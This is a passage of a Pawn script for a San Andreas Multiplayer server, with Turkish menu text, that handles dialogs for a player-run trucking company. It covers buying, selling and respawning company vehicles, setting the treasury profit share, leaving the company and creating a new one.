			format(DiaYazi, 1024, "%s{F8F8FF}Aracý Sat\n", DiaYazi);
 			format(DiaYazi, 1024, "%s{F8F8FF}Aracý Respawn Et", DiaYazi);
 			ShowPlayerDialog(playerid, DialogSirketTirYonet, DIALOG_STYLE_LIST, "{00FF00}Týrý Yönet", DiaYazi, "Seç", "Geri");
	    }
	}

	if(dialogid == DialogSirketTirYonet)
	{
	    if(response)
	    {
			switch(listitem)
			{
			    case 0,1:
			    {
					format(DiaYazi, 1024, "{F8F8FF}Model: {00FF00}%s\n", VehNames[ SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAModel]-400]);
					format(DiaYazi, 1024, "%s{F8F8FF}Fiyat: {00FF00}%d$\n", DiaYazi, SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAFiyat]);
					format(DiaYazi, 1024, "%s{F8F8FF}Kullanabilecek Üye Grubu: {00FF00}%s(%d)\n", DiaYazi, SirketRutbeName[ SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAMinRutbe] ], SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAMinRutbe]);
					format(DiaYazi, 1024, "%s{F8F8FF}Aracý Sat\n", DiaYazi);
 					format(DiaYazi, 1024, "%s{F8F8FF}Aracý Respawn Et", DiaYazi);
 					ShowPlayerDialog(playerid, DialogSirketTirYonet, DIALOG_STYLE_LIST, "{00FF00}Týrý Yönet", DiaYazi, "Seç", "Geri");
			    }

				case 2: // Min Rutbe
				{
				    ShowPlayerDialog(playerid, DialogSirketTirMinRutbe, DIALOG_STYLE_LIST, "{00FF00}Aracý Kullanabilecek Üye Grubu", "{F8F8FF}Üye\n{F8F8FF}Kýdemli Üye\n{F8F8FF}Sað Kol\n{F8F8FF}Patron", "Seç", "Geri");
				}

			    case 3: // Sat
			    {
			        Sirketler[ Sirket[playerid] ][SirketKasa] += SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAFiyat];
			        Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;
					DeleteSirketAraba(SAMenuItem[playerid][ SASItem[playerid] ]);

					SendClientMessage(playerid, -1, "{00FF00}Þirket aracýný sattýnýz.");

	    			new ZaXD;

					foreach(new i:SAs)
					{
   						if(SirketAraba[i][SAExist] != 1) continue;
			    		if(SirketAraba[i][SASirketID] == Sirket[playerid])
			    		{
       						format(DiaYazi, 1024, "%s{FF0000}%d# {F8F8FF}%s\n", DiaYazi, i, VehNames[ SirketAraba[i][SAModel]-400 ]);
							SAMenuItem[playerid][ZaXD] = i;
							ZaXD++;
	    				}
					}

					ShowPlayerDialog(playerid, DialogSirketTir, DIALOG_STYLE_LIST, "{00FF00}Þirket Araç Yönetimi", DiaYazi, "Yönet", "Geri");
			    }

			    case 4: // Respawn Et
			    {
			        SetVehicleToRespawn(SirketAraba[ SAMenuItem[playerid][ SASItem[playerid] ] ][SAAID]);
					SendClientMessage(playerid, -1, "{00FF00}Þirket aracýný respawn ettiniz.");
			    }
			}
	    }else{
	    	new ZaXD;

			foreach(new i:SAs)
			{
   				if(SirketAraba[i][SAExist] != 1) continue;
			    if(SirketAraba[i][SASirketID] == Sirket[playerid])
			    {
       				format(DiaYazi, 1024, "%s{FF0000}%d# {F8F8FF}%s\n", DiaYazi, i, VehNames[ SirketAraba[i][SAModel]-400 ]);
					SAMenuItem[playerid][ZaXD] = i;
					ZaXD++;
	    		}
			}

			ShowPlayerDialog(playerid, DialogSirketTir, DIALOG_STYLE_LIST, "{00FF00}Þirket Araç Yönetimi", DiaYazi, "Yönet", "Geri");
	    }
	}

	if(dialogid == DialogSirketOran)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
				format(DiaYazi, 1024, "{F8F8FF}Þirket Kazanç Payý: {00FF00}Yüzde %d\n \n{F8F8FF}Bu deðer þirket üyelerinin yaptýðý görevlerden gelen paranýn yüzde kaçýnýn þirket kasasýna gittiðini gösterir.\n{F8F8FF}Bu deðer en fazla 70 en az 30 olabilir.");
				return ShowPlayerDialog(playerid, DialogSirketOran, DIALOG_STYLE_INPUT, "{00FF00}Þirket Kazanç Payý", DiaYazi, "Deðiþtir", "Geri");
	        }
	        new oOran = strval(inputtext);

	        if(oOran < 30 || oOran > 70)
	        {
				format(DiaYazi, 1024, "{F8F8FF}Þirket Kazanç Payý: {00FF00}Yüzde %d\n \n{F8F8FF}Bu deðer þirket üyelerinin yaptýðý görevlerden gelen paranýn yüzde kaçýnýn þirket kasasýna gittiðini gösterir.\n{F8F8FF}Bu deðer en fazla 70 en az 30 olabilir.");
				return ShowPlayerDialog(playerid, DialogSirketOran, DIALOG_STYLE_INPUT, "{00FF00}Þirket Kazanç Payý", DiaYazi, "Deðiþtir", "Geri");
	        }

	        Sirketler[ Sirket[playerid] ][SirketOran] = oOran;
	        Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

	        format(DiaYazi, 1024, "{F8F8FF}Þirket Sahibi {00FF00}%s {F8F8FF}þirketin kazanç payýný {00FF00}Yüzde %d {F8F8FF}olarak deðiþtirdi.", GetName(playerid), oOran);

			foreach(new i:Player)
			{
			    if(Sirket[i] == Sirket[playerid])
			    {
			        SendClientMessage(i, -1, DiaYazi);
			    }
			}
	    }else{
	        ShowSirketHomeDialog(playerid);
	    }
	}

	if(dialogid == DialogSirketAyril)
	{
	    if(response)
	    {
			format(DiaYazi, 1024, "{00FF00}%s {F8F8FF}þirketten ayrýldý.", GetName(playerid));

			foreach(new i:Player)
			{
			    if(Sirket[i] == Sirket[playerid])
			    {
			        SendClientMessage(i, -1, DiaYazi);
			    }
			}

			Sirketler[ Sirket[playerid] ][SirketUye]--;
			Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;
			Oyuncu_Kaydet(playerid);

	        Sirket[playerid] = -1;
	        SirketKatki[playerid] = 0;
	    }else{
	        ShowSirketHomeDialog(playerid);
	    }
	}

	if(dialogid == DialogSirketGelistir)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // Þirkete Linerunner Satýn Al
	            {
	                if(Sirketler[ Sirket[playerid] ][SirketKasa] < 50000) return SendClientMessage(playerid, -1, "{FF0000}Þirket kasasýnda bu geliþtirme için yeterli para yok!"),
						ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
					if(GetSirketArabaCount(Sirket[playerid]) == 20) return SendClientMessage(playerid, -1, "{FF0000}Þirkete en fazla 20 araç satýn alabilirsiniz.");
					new Float:oX, Float:oY, Float:oZ, Float:oRot;
					GetPlayerPos(playerid, oX, oY, oZ);
					GetPlayerFacingAngle(playerid, oRot);
					if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Þirket HQ'sunda olmanýz gerekiyor.");

					Sirketler[ Sirket[playerid] ][SirketKasa] -= 50000;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

					oX += (5.0 * floatcos(oRot + 90.0, degrees));
					oY += (5.0 * floatsin(oRot + 90.0, degrees));

					CreateSirketAraba(Sirket[playerid], VehicleLineRunner, 50000, oX, oY, oZ + 2.0, oRot + 90.0);

					SendClientMessage(playerid, -1, "{00FF00}Þirketinize 50.000$'a Linerunner satýn aldýnýz.");
					SendClientMessage(playerid, -1, "{00FF00}Þimdi önünüze gelen aracý /sapark yazarak þirket içinde bir yere park edebilirsiniz.");
					ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
			    }

	            case 1: // Þirkete Tanker Satýn Al
	            {
	                if(Sirketler[ Sirket[playerid] ][SirketKasa] < 75000) return SendClientMessage(playerid, -1, "{FF0000}Þirket kasasýnda bu geliþtirme için yeterli para yok!"),
						ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
					if(GetSirketArabaCount(Sirket[playerid]) == 20) return SendClientMessage(playerid, -1, "{FF0000}Þirkete en fazla 20 araç satýn alabilirsiniz.");
					new Float:oX, Float:oY, Float:oZ, Float:oRot;
					GetPlayerPos(playerid, oX, oY, oZ);
					GetPlayerFacingAngle(playerid, oRot);
					if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Þirket HQ'sunda olmanýz gerekiyor.");

					Sirketler[ Sirket[playerid] ][SirketKasa] -= 75000;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

					oX += (5.0 * floatcos(oRot + 90.0, degrees));
					oY += (5.0 * floatsin(oRot + 90.0, degrees));

					CreateSirketAraba(Sirket[playerid], VehicleTanker, 75000, oX, oY, oZ + 2.0, oRot + 90.0);

					SendClientMessage(playerid, -1, "{00FF00}Þirketinize 75.000$'a Tanker satýn aldýnýz.");
					SendClientMessage(playerid, -1, "{00FF00}Þimdi önünüze gelen aracý /sapark yazarak þirket içinde bir yere park edebilirsiniz.");
					ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
			    }

	            case 2: // Þirkete RoadTrain Satýn Al
	            {
	                if(Sirketler[ Sirket[playerid] ][SirketKasa] < 100000) return SendClientMessage(playerid, -1, "{FF0000}Þirket kasasýnda bu geliþtirme için yeterli para yok!"),
						ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
					if(GetSirketArabaCount(Sirket[playerid]) == 20) return SendClientMessage(playerid, -1, "{FF0000}Þirkete en fazla 20 araç satýn alabilirsiniz.");
					new Float:oX, Float:oY, Float:oZ, Float:oRot;
					GetPlayerPos(playerid, oX, oY, oZ);
					GetPlayerFacingAngle(playerid, oRot);
					if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Þirket HQ'sunda olmanýz gerekiyor.");

					Sirketler[ Sirket[playerid] ][SirketKasa] -= 100000;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

					oX += (5.0 * floatcos(oRot + 90.0, degrees));
					oY += (5.0 * floatsin(oRot + 90.0, degrees));

					CreateSirketAraba(Sirket[playerid], VehicleRoadTrain , 100000, oX, oY, oZ + 2.0, oRot + 90.0);

					SendClientMessage(playerid, -1, "{00FF00}Þirketinize 100.000$'a RoadTrain satýn aldýnýz.");
					SendClientMessage(playerid, -1, "{00FF00}Þimdi önünüze gelen aracý /sapark yazarak þirket içinde bir yere park edebilirsiniz.");
					ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
			    }

	            case 3: // Þirkete Flatbed Satýn Al
	            {
	                if(Sirketler[ Sirket[playerid] ][SirketKasa] < 75000) return SendClientMessage(playerid, -1, "{FF0000}Þirket kasasýnda bu geliþtirme için yeterli para yok!"),
						ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
					if(GetSirketArabaCount(Sirket[playerid]) == 20) return SendClientMessage(playerid, -1, "{FF0000}Þirkete en fazla 20 araç satýn alabilirsiniz.");
					new Float:oX, Float:oY, Float:oZ, Float:oRot;
					GetPlayerPos(playerid, oX, oY, oZ);
					GetPlayerFacingAngle(playerid, oRot);
					if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Þirket HQ'sunda olmanýz gerekiyor.");

					Sirketler[ Sirket[playerid] ][SirketKasa] -= 75000;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

					oX += (5.0 * floatcos(oRot + 90.0, degrees));
					oY += (5.0 * floatsin(oRot + 90.0, degrees));

					CreateSirketAraba(Sirket[playerid], VehicleFlatbed, 75000, oX, oY, oZ + 2.0, oRot + 90.0);

					SendClientMessage(playerid, -1, "{00FF00}Þirketinize 75.000$'a Flatbed satýn aldýnýz.");
					SendClientMessage(playerid, -1, "{00FF00}Þimdi önünüze gelen aracý /sapark yazarak þirket içinde bir yere park edebilirsiniz.");
					ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
			    }

	            case 4: // Þirkete DFT-30 Satýn Al
	            {
	                if(Sirketler[ Sirket[playerid] ][SirketKasa] < 75000) return SendClientMessage(playerid, -1, "{FF0000}Þirket kasasýnda bu geliþtirme için yeterli para yok!"),
						ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
					if(GetSirketArabaCount(Sirket[playerid]) == 20) return SendClientMessage(playerid, -1, "{FF0000}Þirkete en fazla 20 araç satýn alabilirsiniz.");
					new Float:oX, Float:oY, Float:oZ, Float:oRot;
					GetPlayerPos(playerid, oX, oY, oZ);
					GetPlayerFacingAngle(playerid, oRot);
					if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Þirket HQ'sunda olmanýz gerekiyor.");

					Sirketler[ Sirket[playerid] ][SirketKasa] -= 75000;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

					oX += (5.0 * floatcos(oRot + 90.0, degrees));
					oY += (5.0 * floatsin(oRot + 90.0, degrees));

					CreateSirketAraba(Sirket[playerid], VehicleDFT30, 75000, oX, oY, oZ + 2.0, oRot + 90.0);

					SendClientMessage(playerid, -1, "{00FF00}Þirketinize 75.000$'a DFT-30 satýn aldýnýz.");
					SendClientMessage(playerid, -1, "{00FF00}Þimdi önünüze gelen aracý /sapark yazarak þirket içinde bir yere park edebilirsiniz.");
					ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
			    }

	            case 5: // Þirkete Sultan Satýn Al
	            {
	                if(Sirketler[ Sirket[playerid] ][SirketKasa] < 20000000) return SendClientMessage(playerid, -1, "{FF0000}Þirket kasasýnda bu geliþtirme için yeterli para yok!"),
						ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
					if(GetSirketArabaCount(Sirket[playerid]) == 20) return SendClientMessage(playerid, -1, "{FF0000}Þirkete en fazla 20 araç satýn alabilirsiniz.");
					new Float:oX, Float:oY, Float:oZ, Float:oRot;
					GetPlayerPos(playerid, oX, oY, oZ);
					GetPlayerFacingAngle(playerid, oRot);
					if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Þirket HQ'sunda olmanýz gerekiyor.");

					Sirketler[ Sirket[playerid] ][SirketKasa] -= 20000000;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

					oX += (5.0 * floatcos(oRot + 90.0, degrees));
					oY += (5.0 * floatsin(oRot + 90.0, degrees));

					CreateSirketAraba(Sirket[playerid], 560 , 10000000, oX, oY, oZ + 2.0, oRot + 90.0);

					SendClientMessage(playerid, -1, "{00FF00}Þirketinize 20.000.000$'a Sultan satýn aldýnýz.");
					SendClientMessage(playerid, -1, "{00FF00}Þimdi önünüze gelen aracý /sapark yazarak þirket içinde bir yere park edebilirsiniz.");
					ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
			    }

	            case 6: // Þirkete Bullet Satýn Al
	            {
	                if(Sirketler[ Sirket[playerid] ][SirketKasa] < 30000000) return SendClientMessage(playerid, -1, "{FF0000}Þirket kasasýnda bu geliþtirme için yeterli para yok!"),
						ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
					if(GetSirketArabaCount(Sirket[playerid]) == 20) return SendClientMessage(playerid, -1, "{FF0000}Þirkete en fazla 20 araç satýn alabilirsiniz.");
					new Float:oX, Float:oY, Float:oZ, Float:oRot;
					GetPlayerPos(playerid, oX, oY, oZ);
					GetPlayerFacingAngle(playerid, oRot);
					if(oX < Sirketler[ Sirket[playerid] ][SirketMinX] || oY < Sirketler[ Sirket[playerid] ][SirketMinY] || oX > Sirketler[ Sirket[playerid] ][SirketMaxX] || oY > Sirketler[ Sirket[playerid] ][SirketMaxY]) return SendClientMessage(playerid, -1, "{FF0000}Þirket HQ'sunda olmanýz gerekiyor.");

					Sirketler[ Sirket[playerid] ][SirketKasa] -= 30000000;
					Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;

					oX += (5.0 * floatcos(oRot + 90.0, degrees));
					oY += (5.0 * floatsin(oRot + 90.0, degrees));

					CreateSirketAraba(Sirket[playerid], 541 , 15000000, oX, oY, oZ + 2.0, oRot + 90.0);

					SendClientMessage(playerid, -1, "{00FF00}Þirketinize 30.000.000$'a Bullet satýn aldýnýz.");
					SendClientMessage(playerid, -1, "{00FF00}Þimdi önünüze gelen aracý /sapark yazarak þirket içinde bir yere park edebilirsiniz.");
					ShowPlayerDialog(playerid, DialogSirketGelistir, DIALOG_STYLE_LIST, "{00FF00}Þirket Geliþtirme", "{F8F8FF}Linerunner Satýn Al {00FF00}[50.000$]\n{F8F8FF}Tanker Satýn Al {00FF00}[75.000$]\n{F8F8FF}RoadTrain Satýn Al {00FF00}[100.000$]\n{F8F8FF}Flatbed Satýn Al {00FF00}[75.000$]\n{F8F8FF}DFT-30 Satýn Al {00FF00}[75.000$]\n{F8F8FF}Sultan Satýn Al {00FF00}[20.000.000$]\n{F8F8FF}Bullet Satýn Al {00FF00}[30.000.000$]", "Seç", "Geri");
			    }
	        }
	    }else{
	        ShowSirketHomeDialog(playerid);
	    }
	}

	if(dialogid == DialogSirketMSG)
	{
	    if(response)
	    {
		    ShowSirketHomeDialog(playerid);
		}
	}

	if(dialogid == DialogSirketIsim)
	{
	    if(response)
	    {
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogSirketIsim, DIALOG_STYLE_INPUT, "{00FF00}Þirket Ýsmi", "{F8F8FF}Þirketinizin ismini deðiþtirmek istiyorsanýz yeni ismini buraya yazýn:", "Deðiþtir", "Geri");
			format(Sirketler[ Sirket[playerid] ][SirketName], 128, inputtext);
			Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;
			LoadSirketDetails(Sirket[playerid]);
			SendClientMessage(playerid, -1, "{00FF00}Þirketinizin ismini deðiþtirdiniz.");

			ShowSirketHomeDialog(playerid);
	    }else{
	        ShowSirketHomeDialog(playerid);
	    }
	}

	if(dialogid == DialogCSName)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogCSName, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Ýsim", "{F8F8FF}Oluþturmak istediðiniz þirketin adýný yazýn:", "Devam", "Ýptal");
			format(TSirketName[playerid], 128, inputtext);

			ShowPlayerDialog(playerid, DialogCSTag, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Tag", "{F8F8FF}Oluþturmak istediðiniz þirketin tagýný belirleyin(Max 4 Karakter Örneðin: ROTA):", "Devam", "Ýptal");
	    }
	}

	if(dialogid == DialogCSTag)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogCSTag, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Tag", "{F8F8FF}Oluþturmak istediðiniz þirketin tagýný belirleyin(Max 4 Karakter Örneðin: ROTA):", "Devam", "Ýptal");
			format(TSirketTag[playerid], 5, inputtext);

			ShowPlayerDialog(playerid, DialogCSDeger, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Deðer", "{F8F8FF}Oluþturmak istediðiniz þirketin deðerini belirleyin:", "Devam", "Ýptal");
	    }
	}

	if(dialogid == DialogCSDeger)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogCSDeger, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Deðer", "{F8F8FF}Oluþturmak istediðiniz þirketin deðerini belirleyin:", "Devam", "Ýptal");
	        TSirketDeger[playerid] = strval(inputtext);

			ShowPlayerDialog(playerid, DialogCSMaxUye, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Üye Limiti", "{F8F8FF}Oluþturacaðýnýz þirketin üye kapasitesini belirleyiniz:", "Devam", "Ýptal");
	    }
	}

	if(dialogid == DialogCSMaxUye)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogCSMaxUye, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Üye Limiti", "{F8F8FF}Oluþturacaðýnýz þirketin üye kapasitesini belirleyiniz:", "Devam", "Ýptal");
	        TSirketMaxUye[playerid] = strval(inputtext);

			ShowPlayerDialog(playerid, DialogCSRenk1, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Araç Renk 1", "{F8F8FF}Oluþturacaðýnýz þirketin araçlarýnýn 1. rengini belirleyiniz:", "Devam", "Ýptal");
	    }
	}

	if(dialogid == DialogCSRenk1)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogCSRenk1, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Araç Renk 1", "{F8F8FF}Oluþturacaðýnýz þirketin araçlarýnýn 1. rengini belirleyiniz:", "Devam", "Ýptal");
	        TSirketRenk1[playerid] = strval(inputtext);

			ShowPlayerDialog(playerid, DialogCSRenk2, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Araç Renk 2", "{F8F8FF}Oluþturacaðýnýz þirketin araçlarýnýn 2. rengini belirleyiniz:", "Devam", "Ýptal");
	    }
	}

	if(dialogid == DialogCSRenk2)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogCSRenk2, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Araç Renk 2", "{F8F8FF}Oluþturacaðýnýz þirketin araçlarýnýn 2. rengini belirleyiniz:", "Devam", "Ýptal");
	        TSirketRenk2[playerid] = strval(inputtext);

			TSirketDurum[playerid] = 1;
			SendClientMessage(playerid, -1, "{F8F8FF}Þimdi þirket üyelerinin spawn olacaðý noktaya gidip N tuþuna basýn.");
	    }
	}

	switch(dialogid)
	{
		case DialogSirketUyeList:
		{
		    if(response)
		    {
 		        if(listitem == 25)
		        {
		            SirketUyeSayfa[playerid]++;
